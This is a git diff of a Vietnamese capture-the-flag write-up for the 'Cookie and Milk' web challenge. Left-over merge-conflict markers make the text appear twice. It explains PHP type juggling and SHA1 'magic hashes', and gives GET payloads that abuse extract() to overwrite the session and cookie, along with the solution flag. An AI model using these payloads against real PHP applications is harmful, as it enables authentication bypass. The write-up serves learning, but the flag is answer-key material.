@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 # Cookie and Milk 
 
 
@@ -59,3 +60,66 @@ aaroZmOk:0e66507019969427134894567494305185566735
 aaK1STfY:0e76658526655756207688271159624026011393 
 ->  và ta đã có flag 
 ``` CHH{TYpE_jU6gliNg_d5c3bd02e90fd038d98ad9c362715c47}```
+=======
+# Cookie and Milk 
+
+
+[link-challenghe](https://battle.cookiearena.org/challenges/web/cookie-and-milk)
+
+> Bài này có hai keyword được ghi dưới đề bài  : type juggling and hash magic 
+>  đầu tiên là type juggling -> lỗi trong php từ phiên bản 8.x đổ xuống thì nó tùy còn ngữ cảnh mà sẽ ép  hai giá trị khi thực hiện so sánh qua if trong boolean expression về một loại chung , ví dụ như 
+```
+<?php
+// Enter your code here, enjoy!
+$a = "0d4545anh yêu em ";
+$b = 0 ; 
+var_dump($b == $a );
+
+//output 
+bool(true)
+```
+bởi nó sẽ dựa vào một bên chuỗi :  nếu 1 trong 2 là số , thì nó sẽ ép cả hai thành số , còn không cả hai là chuỗi thì nó sẽ có gắng ép thành numbers theo trang chủ php :>  !
+ ![Alt text](image.png)
+như thế kia vì ```$b=0``` là số thì ```$a``` cũng được ép thành số , lúc đó nó chỉ được coi là ```(int)$a``` và nó trở thành 0 cũng là số nên nó sẽ pass điều kiện ! 
+> key word hash magic , khi các hàm mã như MD5 , SHA1 , .... mã ra một chuỗi "0e127617286... "  toàn là số đằng sau thì PHP sẽ hiểu là 0^127617 ... = 0 
+[các bạn có thể xem thêm ở đây](https://github.com/spaze/hashes/blob/master/sha1.md)
+vậy nên chỉ cần tìm hai chuỗi hash magic thì có phải nó đều được parse ra 0 thì 0 == 0  => return true
+
+### BẮT ĐÀUA VÀO BÀI 
+SOURCE CODE : 
+```
+<?php
+include(__DIR__."/flag.php");
+extract($_GET);
+if (isset($_COOKIE['magic']) && isset($_SESSION['magic']))  {
+    if ($_SESSION['magic'] === $_COOKIE['magic']) {
+        echo "I love Cookie Han Hoan";
+    } else if (sha1($_SESSION['magic']) == sha1($_COOKIE['magic'])) {
+        echo $flag;
+    }
+} else {
+    highlight_string(show_source(__FILE__));
+}
+?>
+```
+hàm extract sẽ lấy các key trong array và biến nó thành variable bằng cách thêm $ và lấy value được truyền theo ! 
+Có thể ghi đè luôn các biến có sẵn như $_GET, $_POST,$_COOKIE,$_SESSION 
++nếu như bình thường thì ở phía client mà ko có hàm  ```extract()``` 
+thì mình không thể can thiệp vào giá trị của ```$_SESSION``` được ! 
+ban đầu mình sẽ truyền giá trị của hai biến $_SESSION và $_COOKIE giống nhau : 
+```
+GET /?_COOKIE[magic]=haha&_SESSION[magic]=haha HTTP/1.1
+```
+tham số này sau khi gặpp hàm extract()  sẽ thành  $_COOKIE['magic'] = 'haha' ,$_SESSION['MAGIC'] ="haha" , các value nhận qua biến global đều sẽ ở dạng string .
+OUTPUT :
+![Alt text](image-1.png)
+giờ nhiệm vụ là tìm hai chuỗi hash theo sha1 mà đều ra 0 -> ra flag 
+ở đây mình sẽ lấy 2 payload là : 
+```
+GET /?_COOKIE[magic]=aaroZmOk&_SESSION[magic]=aaK1STfY 
+```
+aaroZmOk:0e66507019969427134894567494305185566735
+aaK1STfY:0e76658526655756207688271159624026011393 
+->  và ta đã có flag 
+``` CHH{TYpE_jU6gliNg_d5c3bd02e90fd038d98ad9c362715c47}```
+>>>>>>> 1e2b711503ede3642cbed596f8aac8842cf5abf3
